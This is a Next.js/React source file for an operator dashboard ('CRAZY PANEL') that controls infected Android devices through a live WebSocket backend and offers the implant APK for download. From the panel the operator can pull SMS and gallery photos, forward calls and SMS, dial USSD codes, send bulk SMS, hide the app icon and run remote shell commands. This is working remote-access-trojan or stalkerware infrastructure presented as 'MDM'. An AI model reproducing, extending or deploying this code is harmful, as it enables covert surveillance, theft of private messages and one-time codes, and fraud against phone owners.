"use client";
import { useState, useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';

export default function Dashboard() {
  const [subTab, setSubTab] = useState('Home');
  const [devices, setDevices] = useState<Record<string, any>>({});
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [toast, setToast] = useState<string | null>(null);
  const [gallery, setGallery] = useState<string[]>([]);
  const [messages, setMessages] = useState<any[]>([]);
  const [perms, setPerms] = useState<any>({});
  const [cmd, setCmd] = useState('');
  const [out, setOut] = useState('Ready...');

  const ws = useRef<WebSocket | null>(null);
  const router = useRouter();

  useEffect(() => {
    ws.current = new WebSocket('wss://onxy-backend.onrender.com/ws?role=admin');
    ws.current.onmessage = (e) => {
      try {
        const d = JSON.parse(e.data);
        if (d.device_id && d.type !== 'error') {
          setDevices(p => ({ ...p, [d.device_id]: { ...p[d.device_id], ...d } }));
          if (!selectedDevice) setSelectedDevice(d.device_id);
        }
        if (d.type === 'gallery_response') { setGallery(d.images || []); showToast(`Fetched photos`); }
        if (d.type === 'sms_response') { setMessages(d.messages || []); showToast(`Fetched messages`); }
        if (d.type === 'permissions_response') { setPerms(d.permissions || {}); showToast('Permissions updated'); }
        if (d.type === 'shell_response') { setOut(d.data); }
      } catch (err) {}
    };
    return () => ws.current?.close();
  }, [selectedDevice]);

  const showToast = (m: string) => { setToast(m); setTimeout(() => setToast(null), 3000); };
  const send = (c: string, p: any = {}) => {
    if (ws.current?.readyState === WebSocket.OPEN && selectedDevice) {
      ws.current.send(JSON.stringify({ target: selectedDevice, type: 'cmd', command: c, payload: p }));
      showToast(`Sending ${c}...`);
    } else showToast("No device selected");
  };
  const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };

  const dev = selectedDevice ? devices[selectedDevice] || {} : {};
  const list = Object.values(devices).filter((d: any) => d.device_id?.toLowerCase().includes(searchQuery.toLowerCase()) || d.model?.toLowerCase().includes(searchQuery.toLowerCase()));

  return (
    <div className="min-h-screen bg-[#0B0C10] text-white flex flex-col md:flex-row font-sans">
      {toast && <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}
      
      <aside className="w-full md:w-80 bg-[#1A1B23] border-r border-gray-800 flex flex-col h-[40vh] md:h-screen">
        <div className="p-4 border-b border-gray-800">
          <div className="flex justify-between items-center mb-4">
            <h1 className="text-lg font-bold text-purple-500">CRAZY PANEL</h1>
            <button onClick={logout} className="text-xs text-red-400 border border-red-900 px-2 py-1 rounded">Logout</button>
          </div>
          <input type="text" placeholder="Search Device ID/Model..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full bg-[#0B0C10] border border-gray-700 rounded p-2 text-xs focus:border-purple-500 outline-none" />
          <div className="flex justify-between text-xs text-gray-400 mt-3"><span>Connected:</span><span className="bg-purple-900 px-2 rounded-full">{Object.keys(devices).length}</span></div>
        </div>
        <div className="flex-1 overflow-y-auto p-2 space-y-1">
          {list.length === 0 ? <div className="text-center text-gray-500 text-xs mt-10">Waiting for devices...</div> : 
            list.map((d: any) => (
              <button key={d.device_id} onClick={() => { setSelectedDevice(d.device_id); setSubTab('Home'); }} className={`w-full text-left p-3 rounded-lg border text-xs ${selectedDevice === d.device_id ? 'bg-purple-900/30 border-purple-500' : 'border-transparent hover:bg-gray-800'}`}>
                <div className="flex justify-between mb-1"><span className="font-bold truncate">{d.model || 'Unknown'}</span><span className="text-green-400">Online</span></div>
                <div className="text-gray-400 font-mono text-[10px]">{d.device_id}</div>
              </button>
            ))
          }
        </div>
        <div className="p-4 border-t border-gray-800"><a href="/crazy-onxy-MDM/app-debug.apk" download className="block text-center text-xs font-bold bg-purple-600 py-2 rounded">⬇ Download APK</a></div>
      </aside>

      <main className="flex-1 flex flex-col h-[60vh] md:h-screen overflow-hidden">
        {selectedDevice ? (
          <div className="flex-1 overflow-y-auto p-4 md:p-6">
            <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
              <h2 className="text-xl font-bold mb-4">{dev.model || 'Device'} <span className="text-xs bg-green-900 text-green-400 px-2 py-0.5 rounded ml-2">Live</span></h2>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                <div><span className="text-gray-500 text-xs block">IP Address</span> <span className="text-blue-400">{dev.ip || 'N/A'}</span></div>
                <div><span className="text-gray-500 text-xs block">Android</span> {dev.android || 'N/A'}</div>
                <div><span className="text-gray-500 text-xs block">Battery</span> <span className="text-green-400">{dev.battery ? `${dev.battery}%` : 'N/A'}</span></div>
                <div><span className="text-gray-500 text-xs block">Status</span> 🟢 Heartbeating</div>
              </div>
            </div>

            <nav className="flex gap-4 md:gap-6 mb-6 border-b border-gray-800 pb-2 overflow-x-auto text-sm">
              {['Home', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(t => (
                <button key={t} onClick={() => setSubTab(t)} className={`pb-2 px-2 ${subTab === t ? 'border-b-2 border-purple-500 font-bold' : 'text-gray-400'}`}>{t}</button>
              ))}
            </nav>

            {subTab === 'Home' && <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              {[{l:'Check Online',i:'📡',c:'CHECK_ONLINE'},{l:'GET SMS',i:'📥',c:'GET_SMS'},{l:'Bulk SMS',i:'✉️',c:'BULK_SMS'},{l:'Send SMS',i:'📤',c:'SEND_SMS'},{l:'SMS Forward',i:'🔄',c:'SMS_FORWARD'},{l:'Call Forward',i:'📞',c:'CALL_FORWARD'},{l:'Dial USSD',i:'🔢',c:'DIAL_USSD'},{l:'Hide Icon',i:'🕵️',c:'HIDE_ICON'}].map((b,i) => (
                <button key={i} onClick={() => send(b.c)} className="bg-[#1A1B23] border border-gray-800 hover:border-purple-500 p-4 rounded-xl flex flex-col items-center gap-2"><span className="text-2xl">{b.i}</span><span className="text-xs">{b.l}</span></button>
              ))}
            </div>}

            {subTab === 'Messages' && <div className="space-y-4">
              <button onClick={() => send('GET_SMS')} className="bg-purple-600 px-4 py-2 rounded text-sm font-bold">Fetch Messages</button>
              {messages.length === 0 ? <div className="text-gray-500 text-sm">No messages.</div> : messages.map((m, i) => (
                <div key={i} className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800 text-sm">
                  <div className="flex justify-between text-xs text-gray-400 mb-2"><span>{m.address}</span><span>{m.date}</span></div>
                  <p>{m.body}</p>
                </div>
              ))}
            </div>}

            {subTab === 'Gallery' && <div className="space-y-4">
              <button onClick={() => { setGallery([]); send('GET_GALLERY', {limit:20}); }} className="bg-blue-600 px-4 py-2 rounded text-sm font-bold">Fetch Photos</button>
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">{gallery.map((b, i) => <img key={i} src={`data:image/jpeg;base64,${b}`} className="w-full h-40 object-cover rounded-lg border border-gray-700" />)}</div>
            </div>}

            {subTab === 'Permissions' && <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 max-w-2xl">
              <div className="flex justify-between mb-4"><h3 className="font-bold">Live Permissions</h3><button onClick={() => send('GET_PERMISSIONS')} className="bg-gray-700 px-3 py-1 text-xs rounded">Fetch</button></div>
              {Object.keys(perms).length === 0 ? <div className="text-gray-500 text-sm">Click Fetch.</div> : Object.entries(perms).map(([k, v]: any) => (
                <div key={k} className="flex justify-between text-sm border-b border-gray-800 py-2"><span>{k}</span><span className={v ? 'text-green-400' : 'text-red-400'}>{v ? '🟢 Allowed' : '🔴 Denied'}</span></div>
              ))}
            </div>}

            {subTab === 'Terminal' && <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
              <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 px-4 py-2 rounded text-sm font-bold">Run</button></div>
              <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
            </div>}
          </div>
        ) : <div className="flex-1 flex items-center justify-center text-gray-500 text-sm">Select a device to manage.</div>}
      </main>
    </div>
  );
}
